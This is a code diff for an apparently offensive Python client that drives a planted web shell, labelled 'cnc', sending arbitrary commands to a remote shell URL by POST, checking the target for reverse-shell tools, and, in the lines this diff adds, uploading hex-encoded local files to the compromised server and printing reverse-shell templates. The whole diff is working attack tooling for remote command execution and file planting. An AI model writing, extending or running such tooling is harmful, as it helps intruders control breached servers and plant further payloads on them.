@@ -2,6 +2,7 @@
 #Reworked:
 #  Added wrapper detection
 #  Interactive client
+#  File upload ability
 #Needed:
 #  Encryption
 #  Reverse Shell Handling
@@ -59,6 +60,7 @@ revshells = {
 
 helpmenu = """
   revshell tool ip port
+  upload {source file} {dest file}
   {command}
   exit
   quit
@@ -80,9 +82,11 @@ class cnc(object):
     self.url = url
     self.wrapper = wrapper
     self.tools = self.enumtools()
-  def webrequest(self, cmd):
+  def webrequest(self, cmd, customHeaders, customData):
+    headers = {"User-Agent": "simpleshell/1.0"}
     data = {"content": cmd}
-    r = http("POST", self.url, data=data)
+    headers.update(customHeaders); data.update(customData)
+    r = http("POST", self.url, headers=headers, data=data)
     if r.status_code == 404:
       print("[!] No shell at URI")
       exit()
@@ -99,7 +103,7 @@ class cnc(object):
     return unhexlify(mid).decode()
   def enumtools(self):
     cmd = f"which {' '.join(str(v) for v in revshells.keys())}"
-    resp = self.webrequest(cmd)
+    resp = self.webrequest(cmd, {}, {})
     return [v for v in revshells.keys() if search(v, resp)]
 
 class aes(object):
@@ -115,6 +119,13 @@ def get_cmd(cmd):
   elif cmd == "help":
     print(helpmenu)
   elif not cmd: return cmddict
+  elif cmd.startswith("upload") and len(cmd.split()) != 3:
+    print("[!] Upload cmd incorrect syntax\n\tupload sourcefile destfile")
+  elif cmd.startswith("upload") and not path.isfile(cmd.split()[1]):
+    print(f"[!] File {cmd.split()[1]} not found")
+  elif cmd.startswith("upload"):
+    cmddict['upl'] =  cmd.split()[2]
+    cmddict['command'] = fileToHex(cmd.split()[1])
   elif cmd == "tools": print('\n'.join(color(f"  {tool}", 'green') for tool in tools))
   elif cmd.startswith("revshell") and len(cmd.split()) != 4:
     print("[!] Revshell command not recognized")
@@ -123,19 +134,25 @@ def get_cmd(cmd):
       print('\n'.join(color(f"  {tool}", 'green') for tool in tools))
   elif cmd.startswith("revshell") and cmd.split()[1] in tools:
     print("not implemented yet.")
+    print(revshells[cmd.split()[1]])
     #return {'command': revshells[cmd.split()[1]], 'cmd': cmd}
   else: cmddict['command'] =  cmd
   return cmddict
 
+def fileToHex(fname):  return hexlify( open(fname, 'rb').read() )
+
 #----------------------------------------------------------------------------
 #Runcall
-run = cnc(url, wrapper, '')
+run = cnc(url, wrapper, None)
 tools = run.tools
 while True:
   cmd = input(color(" $ ","blue"))
   cmd = get_cmd(cmd)
-  if 'command' in cmd.keys():
-    result = run.webrequest(cmd['command'])
+  if 'upl' in cmd.keys():
+    result = run.webrequest(cmd['command'], {}, {'upl': cmd['upl']})
+    print(result)
+  elif 'command' in cmd.keys():
+    result = run.webrequest(cmd['command'], {}, {})
     print(result)
   else: pass
 
